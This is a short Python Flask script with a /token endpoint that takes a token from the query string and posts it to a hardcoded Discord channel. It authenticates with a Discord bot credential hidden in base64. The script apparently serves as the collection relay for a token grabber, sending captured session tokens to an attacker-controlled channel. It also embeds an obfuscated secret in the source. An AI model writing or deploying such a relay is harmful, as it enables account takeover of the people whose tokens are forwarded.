from flask import request, Flask

import base64

app = Flask(__name__)

import requests

@app.route('/token')

def my_route():

  base64_message = 'TlRFd05ERTVOVFExTmpBMU9UTXhNRE14LkduSGNoRy5fd1hvVEZaalhVM3haa2tBWlVRZlJ6QXRvSkNVdGxVc2JqQzgzRQ=='

  base64_bytes = base64_message.encode('ascii')

  message_bytes = base64.b64decode(base64_bytes)

  heade = message_bytes.decode('ascii')

  header = {

"authorization": heade

  }

  

  token = request.args.get('token')

  payload = {

'content': token

  }

  requests.post(f'https://discord.com/api/v10/channels/1094010447889432627/messages', data=payload, headers=header)

  return token

  

if __name__ == "__main__":

	app.run()
